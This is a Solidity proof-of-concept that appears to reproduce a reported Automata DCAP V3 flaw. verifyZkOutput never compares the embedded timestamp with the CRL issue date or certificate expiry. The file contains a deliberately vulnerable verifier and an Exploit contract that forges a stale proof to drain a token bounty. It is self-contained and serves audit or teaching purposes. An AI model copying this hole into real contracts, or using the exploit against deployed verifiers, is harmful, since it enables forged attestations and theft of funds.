// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Automata DCAP — V3 verifyZkOutput ignores the timestamp in the zkVM output
    (Trail of Bits, February 2025).
    The 72 bytes between the quote output and the collateral hashes carry the
    timestamp used inside the RISC0/SP1 program. checkCollateralHashes matches
    the current CRL hash, which no longer lists the compromised PCK cert, and
    nothing compares that timestamp to the CRL issue date. A proof stamped at
    500 is accepted after the cert's notAfter of 1000 and the CRL issued at
    2000. The entrypoint pays a 10-token attestation bounty. */

contract Bounty {
    string public symbol = "BOUNTY";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract V3QuoteVerifier {
    uint256 public constant CRL_ISSUED_AT = 2_000;
    uint256 public constant CERT_NOT_AFTER = 1_000;
    bytes32 public collateralHash;

    constructor(bytes32 _hash) {
        collateralHash = _hash;
    }

    function checkCollateralHashes(uint256 offset, bytes calldata outputBytes) public view returns (bool) {
        return bytes32(outputBytes[offset:offset + 32]) == collateralHash;
    }

    function verifyZkOutput(bytes calldata outputBytes) external view returns (bool success, bytes memory output) {
        uint256 offset = 2 + uint16(bytes2(outputBytes[0:2]));
        // @> VULN: the 72-byte timestamp region at `offset` is never compared to CRL_ISSUED_AT or CERT_NOT_AFTER
        success = checkCollateralHashes(offset + 72, outputBytes);
        if (success) {
            output = outputBytes[2:offset];
        } else {
            output = bytes("Found one or more collaterals mismatch");
        }
    }

    function embeddedTimestamp(bytes calldata outputBytes) public pure returns (uint256) {
        uint256 offset = 2 + uint16(bytes2(outputBytes[0:2]));
        return uint256(bytes32(outputBytes[offset:offset + 32]));
    }
}

contract AttestationEntrypoint {
    V3QuoteVerifier public verifier;
    Bounty public bounty;
    mapping(address => bool) public accepted;

    constructor(V3QuoteVerifier _verifier, Bounty _bounty) {
        verifier = _verifier;
        bounty = _bounty;
    }

    function submit(bytes calldata outputBytes) external {
        (bool ok,) = verifier.verifyZkOutput(outputBytes);
        require(ok, "collateral");
        accepted[msg.sender] = true;
        require(bounty.transfer(msg.sender, 10 ether), "bounty");
    }
}

contract Exploit {
    Bounty public bounty; // nonce 1
    V3QuoteVerifier public verifier; // nonce 2
    AttestationEntrypoint public entry; // nonce 3

    bytes32 public constant COLL_HASH = keccak256("current-crl-without-compromised-pck");
    uint256 public timestamp;
    uint256 public paid;

    constructor() {
        bounty = new Bounty();
        verifier = new V3QuoteVerifier(COLL_HASH);
        entry = new AttestationEntrypoint(verifier, bounty);
        bounty.mint(address(entry), 10 ether);
    }

    function proof() public view returns (bytes memory) {
        bytes2 len = bytes2(uint16(32));
        bytes32 quoteOut = bytes32("quote");
        bytes32 ts = bytes32(uint256(500));
        bytes32 pad = bytes32(0);
        bytes8 tail = bytes8(0);
        return abi.encodePacked(len, quoteOut, ts, pad, tail, COLL_HASH);
    }

    function run() external {
        bytes memory outputBytes = proof();
        timestamp = verifier.embeddedTimestamp(outputBytes);
        entry.submit(outputBytes);
        paid = bounty.balanceOf(address(this));
        require(timestamp == 500, "old timestamp");
        require(timestamp < verifier.CERT_NOT_AFTER(), "cert already expired");
        require(timestamp < verifier.CRL_ISSUED_AT(), "before this CRL");
        require(entry.accepted(address(this)), "attestation accepted");
        require(paid == 10 ether, "bounty paid");
        require(bounty.balanceOf(address(entry)) == 0, "bounty drained");
    }
}
